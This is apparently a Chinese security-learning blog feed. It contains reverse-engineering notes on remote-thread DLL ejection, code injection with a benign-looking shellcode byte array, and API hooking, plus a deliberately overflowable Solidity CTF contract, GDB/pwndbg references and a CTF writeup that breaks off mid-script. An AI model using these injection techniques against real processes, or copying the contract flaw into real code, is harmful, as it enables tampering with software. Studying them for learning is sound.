dllmain函数的不同情形</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649494188248.png" alt="DLL注入方法"></p><h1 id="0x12-DLL卸载"><a href="#0x12-DLL卸载" class="headerlink" title="0x12-DLL卸载"></a>0x12-DLL卸载</h1><h2 id="获取目标进程的句柄"><a href="#获取目标进程的句柄" class="headerlink" title="获取目标进程的句柄"></a>获取目标进程的句柄</h2><pre class="language-c" data-language="c"><code class="language-c">hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID);</code></pre><p>该语句使用进程ID来获取目标进程的进程句柄，下面用获得的进程句柄调用CreateRemoteThread()</p><h2 id="获取FreeLibrary-地址"><a href="#获取FreeLibrary-地址" class="headerlink" title="获取FreeLibrary()地址"></a>获取FreeLibrary()地址</h2><pre class="language-c" data-language="c"><code class="language-c">hModule=GetModule(L"kernel32.dll);pThreadProc=(LPTHREAD_START_ROUTINE)GetProcAddress(hModule,"FreeLibrary");</code></pre><p>若要使目标进程自己调用FreeLibrary()，需要先获得FreeLibrary()的地址。然而上述代码获得的不是加载到目标进程中的FreeLibrary()的地址，而是EjectDll.exe进程中FreeLibrary()的地址，但是FreeLibrary在所有进程中地址是相同的</p><h2 id="在目标进程中运行线程"><a href="#在目标进程中运行线程" class="headerlink" title="在目标进程中运行线程"></a>在目标进程中运行线程</h2><pre class="language-c" data-language="c"><code class="language-c">hThread=CreateRemoteThread(hProcess,NULL,0,pThreadProc,me.modBaseAddr,0,NULL);</code></pre><p>pThreadProc参数是FreeLibrary()的地址，me.modBaseAddr参数是要卸载的DLL的加载地址。将线程函数指定为FreeLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><blockquote><p>CreateRemoteThread()原意是在外部线程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649660793447.png"></p><h1 id="0x13-通过修改PE加载DLL"><a href="#0x13-通过修改PE加载DLL" class="headerlink" title="0x13-通过修改PE加载DLL"></a>0x13-通过修改PE加载DLL</h1><p>也就是修改导入表来使得PE文件运行时直接加载dll</p><p>晚点看</p><h1 id="0x14-代码注入"><a href="#0x14-代码注入" class="headerlink" title="0x14-代码注入"></a>0x14-代码注入</h1><p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术，他一般调用CreateRemoteThread()以远程线程形式运行插入的代码，所以也被称为线程注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662082787.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662157677.png"></p><p>也就是说DLL是将整个DLL注入进程中，而代码注入只是注入必要的代码，所以同时也要报要操作的数据进行注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662257437.png" alt="使用代码注入的原因"></p><h1 id="0x15-汇编代码注入"><a href="#0x15-汇编代码注入" class="headerlink" title="0x15-汇编代码注入"></a>0x15-汇编代码注入</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649924174583.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925196328.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925229842.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925283278.png" alt="关闭自动填充nop"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649926423283.png"></p><p>接下来将插入的asm的机器码进行复制，并修改格式</p><p>得到</p><pre class="language-c" data-language="c"><code class="language-c">char shellcode[] = {0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};</code></pre><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649985152689.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650001282882.png"></p><h1 id="0x16-API钩取"><a href="#0x16-API钩取" class="headerlink" title="0x16-API钩取"></a>0x16-API钩取</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003507541.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003531886.png" alt="钩取流程"></p><p>因为在用户模式下要访问系统资源时，我们没有办法直接访问到，所以为了运行实际的应用程序代码，需要加载许多系统库，也就是DLL</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003724601.png" alt="用户代码访问系统资源"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003764098.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003805976.png"></p><p>实际就是对API调用时进行钩取，获得控制权</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004065936.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004108572.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004149588.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004326551.png" alt="实现API钩取的方法"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004361901.png"></p><h1 id="0x17-记事本WriteFIle-API钩取"><a href="#0x17-记事本WriteFIle-API钩取" class="headerlink" title="0x17-记事本WriteFIle()API钩取"></a>0x17-记事本WriteFIle()API钩取</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-调试Helloworld程序&quot;&gt;&lt;a href=&quot;#0x00-调试Helloworld程序&quot; class=&quot;headerlink&quot; title=&quot;0x00-调试Helloworld程序&quot;&gt;&lt;/a&gt;0x00-调试Helloworld程序&lt;/h1&gt;&lt;p&gt;&lt;i</summary>
      
    
    
    
    
    <category term="Book" scheme="https://gift1a.github.io/tags/Book/"/>
    
  </entry>
  
  <entry>
    <title>BlockChain</title>
    <link href="https://gift1a.github.io/2022/04/06/BlockChain/"/>
    <id>https://gift1a.github.io/2022/04/06/BlockChain/</id>
    <published>2022-04-06T12:44:16.000Z</published>
    <updated>2022-04-20T01:22:50.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00-环境配置"></a>0x00-环境配置</h1><p><a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">https://www.cnblogs.com/KRDecad3/p/10798383.html</a></p><p>Rinkeby获取测试币网站</p><p><a href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a></p><p>其他的获取都没啥问题，选择购买-&gt;第二个即可</p><p><img src="/2022/04/06/BlockChain/1649249439831.png"></p><h1 id="0x01-基础使用"><a href="#0x01-基础使用" class="headerlink" title="0x01-基础使用"></a>0x01-基础使用</h1><p>可以本地化安装，也可以使用在线网站 <a href="http://remix.ethereum.org/">http://remix.ethereum.org</a> </p><h2 id="0x00-创建文件"><a href="#0x00-创建文件" class="headerlink" title="0x00-创建文件"></a>0x00-创建文件</h2><p>按照如下操作创建新文件，名称后缀为.sol</p><p><img src="/2022/04/06/BlockChain/1649250592024.png"></p><h2 id="0x01-源码编译"><a href="#0x01-源码编译" class="headerlink" title="0x01-源码编译"></a>0x01-源码编译</h2><p>源代码</p><pre class="language-solidity" data-language="solidity"><code class="language-solidity">pragma solidity ^0.4.23;contract Trans{        string flag;    mapping(address =&gt; uint256) balances;    constructor () public {        //flag = WHAT_YOU_WANT;    }        function getBalance() public returns (bool){        balances[msg.sender] = 100;        return true;    }        function showBalance() public view returns (uint256){        return balances[msg.sender];    }        function Transfer(address[] _addr, uint256 _value) public returns (bool){        uint times = _addr.length;        uint256 amount = uint256(times) * _value;        require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);        require(times &gt; 0 &amp;&amp; times &lt; 10);        balances[msg.sender] -= amount;        for(uint i = 0; i &lt; times; i++){            balances[_addr[i]] += _value;        }        return true;    }        function getFlag() public view returns (string){        require(balances[msg.sender] &gt; 9999999);        return flag;    }}</code></pre><p>一些说明</p><p>我们选择的COMPILER需要和题目的源码的版本一致</p><p><img src="/2022/04/06/BlockChain/1649250475741.png"></p><p>然后我选择了自动编译</p><h2 id="0x02-配置题目合约"><a href="#0x02-配置题目合约" class="headerlink" title="0x02-配置题目合约"></a>0x02-配置题目合约</h2><p><img src="/2022/04/06/BlockChain/1649251440698.png" alt="一些说明"></p><p>弄好之后点击Deploy即可，然后他会连接并让我们确认支付</p><p>然后这些就是函数</p><p><img src="/2022/04/06/BlockChain/1649251873154.png"></p><h1 id="0x02-刷题网站"><a href="#0x02-刷题网站" class="headerlink" title="0x02-刷题网站"></a>0x02-刷题网站</h1><p><a href="https://chainflag.org/challenges">https://chainflag.org/challenges</a></p><p>因为智能合约基本是solidity语法，所以需要学习一下</p><p><a href="https://www.jianshu.com/p/70aecda3212e">https://www.jianshu.com/p/70aecda3212e</a></p>]]></content>
    
    
    <summary type="html">BlockChain</summary>
    
    
    
    
    <category term="BlockChain" scheme="https://gift1a.github.io/tags/BlockChain/"/>
    
  </entry>
  
  <entry>
    <title>PWN基本工具</title>
    <link href="https://gift1a.github.io/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/"/>
    <id>https://gift1a.github.io/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/</id>
    <published>2022-04-06T02:25:58.000Z</published>
    <updated>2022-04-20T01:52:13.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-GDB工具安装"><a href="#0x00-GDB工具安装" class="headerlink" title="0x00-GDB工具安装"></a>0x00-GDB工具安装</h1><p><a href="https://zhuanlan.zhihu.com/p/129837931">https://zhuanlan.zhihu.com/p/129837931</a></p><p>gdb这三个插件不能同时运行，可以使用命令</p><pre class="language-none"><code class="language-none">vim ~/.gdbinit</code></pre><p><img src="/2022/04/06/PWN%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/1649212326580.png" alt="gdbinit"></p><p>不需要使用哪个就注释掉哪个</p><h1 id="0x01-GDB基本使用"><a href="#0x01-GDB基本使用" class="headerlink" title="0x01-GDB基本使用"></a>0x01-GDB基本使用</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先先使用gcc生成elf文件，-g表示可以debug</p><pre class="language-none"><code class="language-none">gcc inputfile -o outputfile -g</code></pre><p>使用下面命令打开</p><pre class="language-none"><code class="language-none">gdb file</code></pre><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">https://blog.csdn.net/Breeze_CAT/article/details/103789233</a></p><p><a href="https://www.cnblogs.com/zhwer/p/12494317.html">https://www.cnblogs.com/zhwer/p/12494317.html</a></p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre class="language-c" data-language="c"><code class="language-c">help//帮助i//infoi b//info break查看所有断点信息i r//info registers 查看各个寄存器当前的值i f//info function 查看所有函数名，保留符号show //和info相似，但是是查看调试器的基本信息show args//查看参数backtrace//查看调用堆栈q//quit退出</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><pre class="language-c" data-language="c"><code class="language-c">s//step，单步步入，跟进函数中，也就是step into，源码层面的一步，F7si//同s，汇编层面的一步n//next，单步补过，F8，源码层面的一步ni//同n，汇编层面的一步c//continue，F9，继续执行到断点r//run，重新开始执行</code></pre><h3 id="断点指令-break"><a href="#断点指令-break" class="headerlink" title="断点指令-break"></a>断点指令-break</h3><pre class="language-c" data-language="c"><code class="language-c">b*(0x123456)//给0x123456地址的指令下断点b*$rebase(0x123456)//$rebase在调试开PIE的程序的时候可以直接加上程序的随即地址b func_name//给函数func_name下断点，目标文件要保留符号才行    b file_name:func_nameb file_name:15//给file_name的15行下断点，需要有源码    b 15b +0x10//在程序当前停住的位置下0x10的位置下断点，也可以-0x10，就是前0x10break fun if $rdi==5//条件断点，rdi的值为5的时候才断</code></pre><p>删除、禁用断点的指令</p><pre class="language-c" data-language="c"><code class="language-c">//先使用i b查看断点编号delete 5//删除5号断点，如果直接delete不加数字，表示删除所有断点disable 5//禁用5号断点    enable 5//启用5号断点clear//清除下面的所有断点</code></pre><p>内存断点指令</p><pre class="language-c" data-language="c"><code class="language-c">watch 0x123456//0x123456地址的数据改变的时候会断watch a//变量a改变的时候会断info watchpoints//查看watch断点信息</code></pre><h3 id="打印指令"><a href="#打印指令" class="headerlink" title="打印指令"></a>打印指令</h3><p>查看内存指令x</p><pre class="language-c" data-language="c"><code class="language-c">x /nuf 0x123456//x指令的格式是：x /nfu，nfu代表三个参数    n//代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在'/'后面    u//代表一个单元几个字节，b(一个字节),h(两个字节)，w(四字节)，g(八字节)    f//代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n    x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。        t 按二进制格式显示变量。        a 按十六进制格式显示变量。        c 按字符格式显示变量。        f 按浮点数格式显示变量。        s 按字符串显示。        b 按字符显示。        i 显示汇编指令。x /10gx 0x123456//从0x123456开始每个单元八个字节，十六进制显示十个单元的数据x /10xd $rdi//从rdi指向的地址向后打印十个单元，每个单元四字节的十进制数x /10i 0x123456//从0x123456处向后显示十条汇编指令</code></pre><p>打印指令p(print)</p><pre class="language-c" data-language="c"><code class="language-c">p func_name//打印func_name的地址，需要保留符号p 0x10-0x8//计算0x10-0x8的结果p &amp;a//查看变量a的地址p *(0x123456)//查看0x123456的值p $rdi//显示rdi寄存器的值    p *($rdi)//显示rdi指向的值</code></pre><p>打印汇编指令disass(disassemble)</p><pre class="language-c" data-language="c"><code class="language-c">disass 0x123456//显示0x123456前后的汇编指令x /10i //前面说过了</code></pre><p>打印源代码list</p><pre class="language-c" data-language="c"><code class="language-c">list//查看当前附近10行的代码    list 38//查看28行附近10行的代码    list 1,10//查看1-10行代码    list main//查看main函数的开始10行</code></pre><h3 id="查找指令"><a href="#查找指令" class="headerlink" title="查找指令"></a>查找指令</h3><pre class="language-c" data-language="c"><code class="language-c">search rdi//从当前位置向后查找包含rdi的指令find "hello"//查找hello字符串，pwndbg独有</code></pre><h3 id="修改数据指令-set"><a href="#修改数据指令-set" class="headerlink" title="修改数据指令-set"></a>修改数据指令-set</h3><pre class="language-c" data-language="c"><code class="language-c">set $rdi=0x10//把寄存器的值变为0x10set *(0x123456)=0x10//把0x123456地址的值变为0x10，注意带星号set args "abc" "def" "gh"//给参数123赋值</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre class="language-c" data-language="c"><code class="language-c">堆操作指令（pwndbg插件独有）arena //显示arena的详细信息arenas //显示所有arena的基本信息arenainfo //好看的显示所有arena的信息bins //常用，查看所有种类的堆块的链表情况fastbins //单独查看fastbins的链表情况largebins //同上，单独查看largebins的链表情况smallbins //同上，单独查看smallbins的链表情况unsortedbin //同上，单独查看unsortedbin链表情况tcachebins //同上，单独查看tcachebins的链表情况tcache //查看tcache详细信息heap //数据结构的形式显示所有堆块，会显示一大堆heapbase //查看堆起始地址heapinfo、heapinfoall //显示堆得信息，和bins的挺像的，没bins好用parseheap //显示堆结构，很好用tracemalloc //好用，会跟提示所有操作堆的地方其他pwndbg插件独有指令cyclc 50 //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama$reabse //开启PIE的情况的地址偏移b *$reabse(0x123456) //断住PIE状态下的二进制文件中0x123456的地方codebase //打印PIE偏移，与rebase不同，这是打印，rebase是使用stack //查看栈retaddr //打印包含返回地址的栈地址canary //直接看canary的值plt //查看plt表got //查看got表hexdump //像IDA那样显示数据，带字符串</code></pre>]]></content>
    
    
    <summary type="html">PWN的一些基本工具</summary>
    
    
    
    
    <category term="PWN" scheme="https://gift1a.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>动态链接库创建与使用</title>
    <link href="https://gift1a.github.io/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://gift1a.github.io/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-04T08:59:59.000Z</published>
    <updated>2022-04-06T05:48:00.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00-参考文章"></a>0x00-参考文章</h1><p><a href="https://blog.csdn.net/LyRics1996/article/details/120246497">https://blog.csdn.net/LyRics1996/article/details/120246497</a></p><h1 id="0x01-创建动态链接库"><a href="#0x01-创建动态链接库" class="headerlink" title="0x01-创建动态链接库"></a>0x01-创建动态链接库</h1><p>下面以VS为例</p><p>在创建新项目找到动态链接库DLL</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649068184192.png"></p><p>创建之后是这样的</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649068250968.png"></p><p>替换成我们待会要调用的函数</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649070264273.png" alt="替换之后"></p><p>之所以要在函数前面加上extern “C” __declspec(dllexport)</p><p>是因为在导出的时候可能会增加一些符号，这样的话函数的名称会被修改，待会GetProcAddress就无法调用了</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649070418832.png" alt="说明"></p><h1 id="0x03-调用动态链接库"><a href="#0x03-调用动态链接库" class="headerlink" title="0x03-调用动态链接库"></a>0x03-调用动态链接库</h1><p>首先先要加载动态链接库，使用LoadLibrary，有两种方式</p><pre class="language-c" data-language="c"><code class="language-c">handle = LoadLibrary(L"Dll1.dll");handle = LoadLibrary(_TEXT("D:\\new\\AD\\C语言\\Dll1\\Debug\\Dll1.dll"));</code></pre><p>使用下面这种方式的话需要#include&lt;tcahr.h&gt;</p><p>GetProcAddress调用DLL文件中的函数</p><p>我们需要使用typedef为函数指针创建匹配类型的指针</p><p>因为函数名就是函数的地址，所以可以直接赋值和调用，下面两种都可以调用函数，震惊！C语言白学了</p><p><img src="/2022/04/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/1649072130088.png"></p><p>代码如下</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;#include&lt;iostream&gt;#include &lt;tchar.h&gt;typedef int(*Lpfunc)(int a,int b);//先定义函数指针int main(){HMODULE handle;handle = LoadLibrary(L"Dll1.dll");handle = LoadLibrary(_TEXT("Dll1.dll"));Lpfunc add = NULL;add = (Lpfunc)GetProcAddress(handle, "add");printf("%d\n", add(3, 4));FreeLibrary(handle);//释放资源return 0;}</code></pre><p>typedef声明函数指针</p><p><a href="https://blog.csdn.net/afei__/article/details/82011613">https://blog.csdn.net/afei__/article/details/82011613</a></p><p>当然我们也可以多层调用</p><p>dll文件中</p><pre class="language-c" data-language="c"><code class="language-c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include&lt;stdio.h&gt;extern "C" _declspec (dllexport)void Print(int k){    printf("%d\n", k);}extern "C" _declspec (dllexport)int add(int a, char b){    int c = a + b;    Print(c);    return c;}</code></pre><p>python调用dll-ctype</p><p><a href="https://docs.python.org/3/library/ctypes.html">https://docs.python.org/3/library/ctypes.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-参考文章&quot;&gt;&lt;a href=&quot;#0x00-参考文章&quot; class=&quot;headerlink&quot; title=&quot;0x00-参考文章&quot;&gt;&lt;/a&gt;0x00-参考文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/LyRics1996/</summary>
      
    
    
    
    
    <category term="PE" scheme="https://gift1a.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>近期题目复现</title>
    <link href="https://gift1a.github.io/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gift1a.github.io/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-04T07:15:00.000Z</published>
    <updated>2022-04-20T01:15:28.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Zer0pts2022-service"><a href="#0x00-Zer0pts2022-service" class="headerlink" title="0x00-Zer0pts2022-service"></a>0x00-Zer0pts2022-service</h1><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>先定位到正确的判断，进入加密函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057498918.png"></p><p>可以看到有几个api函数，并且只有所有的值都相等，才能实现return的值为1</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057543911.png"></p><p>但是动调的时候很多函数看不到，而且这里面有很多东西未被正确识别，所以使用X64DBG打开并定位到加密函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057759455.png" alt="加密函数"></p><p>首先我们要知道x64的函数调用机制</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057831750.png"></p><p>所以在call前的那几个mov就是函数的参数</p><p>先看循环的次数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057937520.png" alt="rbp-0x44"></p><p>很明显这段就是循环的判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649057978804.png" alt="循环判断"></p><p>循环内部，可以看到有三个api函数，先不管</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058022189.png"></p><p>因为刚才在ida看到，最后是有一个比较的，我们先确定存储加密后字符串的位置，根据这个跳转和0x1F也就是31，确定这就是判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058122264.png"></p><p>可以看到在这之前先把两个地址存放的一个byte放入edx和eax中，我们就可以定位过去，先运行到这</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058190552.png" alt="关键判断"></p><p>可以看到，我们通过64FD80-0x40得到了存放加密字符串的地址，那么这一段就是循环判断</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058453221.png"></p><p>接下来我们重新运行一下，然后这次我们先右键锁定堆栈，观察他的变化</p><p>先来看一下第一个API函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058638150.png" alt="CryptCreateHash"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptCreateHash(  [in]  HCRYPTPROV hProv,  [in]  ALG_ID     Algid,  [in]  HCRYPTKEY  hKey,  [in]  DWORD      dwFlags,  [out] HCRYPTHASH *phHash);</code></pre><p>而前面的一些是函数的参数，关键的是下面这个，我们点进这个链接</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058819510.png" alt="关键参数"></p><p>0x800C，和我们的参数对应上了，那么这个应该就是加密的方式</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058866139.png"></p><p>再看第二个函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649058990852.png" alt="CryptHashData"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptHashData(  [in] HCRYPTHASH hHash,  [in] const BYTE *pbData,  [in] DWORD      dwDataLen,  [in] DWORD      dwFlags);</code></pre><p>关键是是我们加密的数据和数据的长度，也就是说每次取出2长度的字符串生成hashdata</p><p>再看第三个</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059153629.png" alt="CryptGetHashParam"></p><pre class="language-c" data-language="c"><code class="language-c">BOOL CryptGetHashParam(  [in]      HCRYPTHASH hHash,  [in]      DWORD      dwParam,  [out]     BYTE       *pbData,  [in, out] DWORD      *pdwDataLen,  [in]      DWORD      dwFlags);</code></pre><p>具体的可以不用细看，只需知道这一段是真正的加密，因为在执行前，目标地址没有数据</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059338076.png"></p><p>执行后</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059375141.png"></p><p>所以整个过程就是将我们输入的每两位进行sha256加密，然后和他给我们的hash表进行表，那我们就可以先生成两字符的sha256彩虹表，然后反查</p><p>验证一下</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059489991.png" alt="sha256表"></p><p>flag格式是zer0pts，取前两个字符进行sha256加密，正好对应</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649059547681.png"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python">hash = [  "33129567e0bd787efb15a26307e5311e06ba66e3b8dbc2206ad59f99780a4d78",  "dd191696e15e2ee293410d02454c5f9461a2249dee6d57c75f264eaeb83a3782",  "e75b11da693d7bb5273985dcf9f02729455da7e7c80e54a0615e00ec2ae76d8e",  "04249e0c258e1a4e43cfdae291a835cd15735f650bbbba0465ada1cd9846622a",  "e4223ed20d7ea5740a326e2b268ca6db91d041cf5194f577e393a8ba3b85d8e9",  "8b53639f152c8fc6ef30802fde462ba0be9cf085f7580dc69efd72e002abbb35",  "0117834bf60dcf977229bf1e982cf9bc63b60ef42052f7ce7e800ce1216a9af6",  "741d14df730e53a5a019a710116f696db4ec23a132b74cf6fbb3cf7617e68313",  "e30e580a4c2916bcff30ca047f2d6a494168ceaf8fb9171037a773a9f8e7268e",  